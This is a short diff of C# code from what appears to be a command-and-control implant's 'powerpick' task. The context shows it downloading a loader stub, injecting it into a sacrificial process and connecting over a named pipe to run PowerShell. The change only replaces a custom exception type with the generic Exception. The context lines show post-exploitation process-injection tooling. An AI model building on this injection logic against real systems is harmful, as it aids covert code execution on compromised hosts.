@@ -149,7 +149,7 @@ namespace Tasks
                 }
                 if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] psPic))
                 {
-                    throw new ExecuteAssemblyException($"Failed to download powerpick loader stub (with id: {parameters.LoaderStubId})");
+                    throw new Exception($"Failed to download powerpick loader stub (with id: {parameters.LoaderStubId})");
                 }
 
                 ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
@@ -163,7 +163,7 @@ namespace Tasks
                 }
                 catch (Exception e)
                 {
-                    throw new ExecuteAssemblyException($"Failed to start '{info.Application}' sacrificial process: {e.Message}");
+                    throw new Exception($"Failed to start '{info.Application}' sacrificial process: {e.Message}");
                 }
 
                 _agent.GetTaskManager().AddTaskResponseToQueue(
@@ -175,7 +175,7 @@ namespace Tasks
                 );
                 if (!proc.Inject(psPic))
                 {
-                    throw new ExecuteAssemblyException($"Failed to inject powerpick loader into sacrificial process {info.Application}.");
+                    throw new Exception($"Failed to inject powerpick loader into sacrificial process {info.Application}.");
                 }
                 _agent.GetTaskManager().AddTaskResponseToQueue(
                     CreateTaskResponse("", false, messages:
@@ -203,7 +203,7 @@ namespace Tasks
                 client.Disconnect += Client_Disconnect;
                 if (!client.Connect(10000))
                 {
-                    throw new ExecuteAssemblyException($"Injected powershell into sacrificial process: {info.Application}.\n Failed to connect to named pipe: {parameters.PipeName}.");
+                    throw new Exception($"Injected powershell into sacrificial process: {info.Application}.\n Failed to connect to named pipe: {parameters.PipeName}.");
                 }
 
                 IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
